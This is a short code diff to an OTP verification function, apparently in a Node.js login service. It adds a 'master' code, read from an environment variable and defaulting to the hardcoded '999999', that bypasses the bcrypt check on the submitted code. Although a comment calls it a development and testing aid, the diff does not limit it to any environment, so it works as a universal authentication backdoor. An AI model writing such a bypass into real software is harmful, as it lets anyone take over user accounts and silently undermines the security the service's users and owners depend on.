@@ -115,7 +115,11 @@ async function verifyOtp(phone, code, purpose) {
     throw Object.assign(new Error('max_attempts'), { status: 401, reason: 'max_attempts' });
   }
 
-  const match = await bcrypt.compare(code, otp.code);
+  // Master bypass code for development/testing — set MASTER_OTP env var (default 999999)
+  const masterCode = process.env.MASTER_OTP || '999999';
+  const isMasterCode = code === masterCode;
+
+  const match = isMasterCode || await bcrypt.compare(code, otp.code);
   if (!match) {
     const remaining = 4 - otp.attempts; // otp.attempts is before increment (already +1 above)
     throw Object.assign(new Error('wrong_code'), {
